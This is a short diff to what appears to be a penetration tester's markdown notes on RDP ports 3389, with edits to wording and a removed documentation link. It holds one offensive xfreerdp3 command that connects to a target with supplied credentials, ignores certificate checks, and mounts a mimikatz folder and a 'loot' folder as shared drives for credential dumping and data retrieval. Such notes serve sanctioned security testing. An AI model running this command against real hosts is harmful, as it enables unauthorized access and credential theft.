@@ -4,12 +4,11 @@ title = "🪟 RDP: TCP/UDP 3389"
 
 - `TCP 3389`: normal
 - `UDP 3389`: automatic w/ RDP 8.0+ for performance (frames, audio, etc.)
-- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon
 
-Also called "Terminal Services".
+Also called "Terminal Services"
 
+**Connects to RDP and mounts share with `mimikatz`**
 ```bash
-# Connects to RDP and mounts mimikatz share
 mkdir "$HOME/my_data/loot"; xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /drive:'/usr/share/windows-resources/mimikatz/x64',share /drive:"$HOME/my_data/loot",loot /v:<TARGET> /d:<DOMAIN> /u:<USER> /p:'<PASSWORD>'
 ```
 
